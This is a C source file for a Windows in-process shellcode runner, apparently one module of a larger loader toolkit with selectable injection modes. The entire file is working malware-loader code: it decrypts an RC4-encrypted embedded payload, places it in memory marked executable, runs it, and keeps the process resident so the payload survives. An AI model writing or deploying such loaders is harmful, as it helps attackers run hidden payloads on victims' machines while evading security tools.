/*
 * Minimal in-process shellcode runner. Selected with --inject self and built
 * as a plain executable: no staged DLL, no reflective mapping, no injection,
 * no syscall spoofing, no child process.
 *
 * The embedded blob is RC4-encrypted at rest. This file decrypts it, copies it
 * into one private allocation, marks the allocation executable, and calls the
 * entry. The process stays resident after the call so a payload that returns
 * from its first thread cannot be torn down by the host exiting.
 */
#include <windows.h>

#include <stddef.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#include "config.h"
#include "util/rc4.h"

#if !defined(SELF_LOAD) || !defined(STAGED_LOADER_MINIMAL)
#error "selfload.c requires SELF_LOAD and STAGED_LOADER_MINIMAL"
#endif

extern const unsigned char staged_loader_payload_start[];
extern const unsigned char staged_loader_payload_end[];
extern const unsigned char staged_loader_key_start[];
extern const unsigned char staged_loader_key_end[];

static int run_payload(void) {
  const size_t enc_len =
      (size_t)(staged_loader_payload_end - staged_loader_payload_start);
  const size_t key_len =
      (size_t)(staged_loader_key_end - staged_loader_key_start);
  unsigned char *plain = NULL;
  size_t plain_len = 0;
  void *image = NULL;
  DWORD old = 0;

  if (rc4_decrypt_alloc(staged_loader_payload_start, enc_len,
                        staged_loader_key_start, key_len, &plain,
                        &plain_len) != 0) {
    return 1;
  }
  image =
      VirtualAlloc(NULL, plain_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (image == NULL) {
    free(plain);
    return 1;
  }
  memcpy(image, plain, plain_len);
  free(plain);

  if (!VirtualProtect(image, plain_len, PAGE_EXECUTE_READ, &old)) {
    VirtualFree(image, 0, MEM_RELEASE);
    return 1;
  }
  FlushInstructionCache(GetCurrentProcess(), image, plain_len);

  ((void(WINAPI *)(void *))image)(NULL);
  Sleep(INFINITE);
  return 0;
}

int main(void) { return run_payload(); }
